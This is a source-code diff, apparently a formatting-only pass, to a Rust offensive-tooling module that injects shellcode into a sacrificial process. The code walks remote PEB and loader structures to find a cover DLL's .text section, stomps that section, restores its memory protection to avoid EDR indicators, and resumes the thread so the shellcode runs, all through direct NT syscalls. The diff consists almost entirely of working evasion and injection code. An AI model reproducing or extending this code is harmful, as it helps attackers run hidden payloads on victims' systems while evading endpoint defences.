@@ -122,8 +122,7 @@ impl Drop for SacrificialProcess {
                 if !self.main_thread.is_null() {
                     let _ = crate::syscalls::nt_close(rt, self.main_thread as usize);
                 }
-            } else if let Some(addr) =
-                crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle")
+            } else if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle")
             {
                 type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
                 let close: CloseHandle = core::mem::transmute(addr);
@@ -331,7 +330,11 @@ unsafe fn stomp_and_resume(
     // Step 5: VirtualProtectEx RWX→RX (restore the cover's nominal protection).
     //    Check the return — v0.3.0 used 'let _ =' and silently left .text RWX
     //    on failure, which is a louder EDR IOC than the original RX.
-    if unsafe { remote_protect(proc.handle, text.base, text.len, 0x20 /* ER */) }.is_err() {
+    if unsafe {
+        remote_protect(proc.handle, text.base, text.len, 0x20 /* ER */)
+    }
+    .is_err()
+    {
         return Err("VirtualProtectEx RWX→RX restore failed");
     }
     // Step 6: ResumeThread — the shellcode now runs from the cover DLL's .text.
@@ -571,13 +574,25 @@ unsafe fn remote_module_base(h: *mut core::ffi::c_void, name: &[u8]) -> Option<u
         let mut entry = [0u8; 0x68];
         unsafe { remote_read(h, rpm, link, &mut entry) }?;
         let dll_base = u64::from_le_bytes([
-            entry[0x30], entry[0x31], entry[0x32], entry[0x33], entry[0x34], entry[0x35],
-            entry[0x36], entry[0x37],
+            entry[0x30],
+            entry[0x31],
+            entry[0x32],
+            entry[0x33],
+            entry[0x34],
+            entry[0x35],
+            entry[0x36],
+            entry[0x37],
         ]) as usize;
         let name_len = u16::from_le_bytes([entry[0x58], entry[0x59]]) as usize;
         let name_buf = u64::from_le_bytes([
-            entry[0x60], entry[0x61], entry[0x62], entry[0x63], entry[0x64], entry[0x65],
-            entry[0x66], entry[0x67],
+            entry[0x60],
+            entry[0x61],
+            entry[0x62],
+            entry[0x63],
+            entry[0x64],
+            entry[0x65],
+            entry[0x66],
+            entry[0x67],
         ]) as usize;
         if name_len / 2 == name.len() && name_buf != 0 && name_len <= 520 {
             let mut wname = [0u8; 520];
@@ -639,8 +654,9 @@ unsafe fn remote_module_base_ldr(
     if unsafe { nqip(h, 0, pbi.as_mut_ptr() as *mut _, 48, &mut ret_len) } != 0 {
         return None;
     }
-    let peb = u64::from_le_bytes([pbi[8], pbi[9], pbi[10], pbi[11], pbi[12], pbi[13], pbi[14], pbi[15]])
-        as usize;
+    let peb = u64::from_le_bytes([
+        pbi[8], pbi[9], pbi[10], pbi[11], pbi[12], pbi[13], pbi[14], pbi[15],
+    ]) as usize;
     if peb == 0 {
         return None;
     }
@@ -685,14 +701,13 @@ unsafe fn remote_text_region(
     // Read the NT headers (24-byte signature + FileHeader) to get section count
     // + size of optional header.
     let nt_off = cover_base + e_lfanew;
-    let (num_sections, size_opt_hdr) =
-        unsafe { remote_text_region_nt_headers(h, rpm, nt_off) }?;
+    let (num_sections, size_opt_hdr) = unsafe { remote_text_region_nt_headers(h, rpm, nt_off) }?;
     let sections_off = nt_off + 24 + size_opt_hdr;
     // Scan the section headers (40 bytes each) for ".text".
     for i in 0..num_sections {
-        if let Some(region) = unsafe {
-            remote_text_region_section(h, rpm, cover_base, sections_off + i * 40)
-        } {
+        if let Some(region) =
+            unsafe { remote_text_region_section(h, rpm, cover_base, sections_off + i * 40) }
+        {
             return Ok(region);
         }
     }
@@ -1285,9 +1300,7 @@ fn do_inject_sacrificial_threadless(spawn_to: &str, shellcode: &[u8]) -> nyx_pro
     };
     match unsafe { create_sacrificial(target) } {
         Ok(mut proc) => {
-            let res = match unsafe {
-                threadless_inject(proc.handle, proc.main_thread, shellcode)
-            } {
+            let res = match unsafe { threadless_inject(proc.handle, proc.main_thread, shellcode) } {
                 Ok(()) => {
                     // The sacrificial's main thread is now executing
                     // the shellcode — the Drop guard must NOT terminate
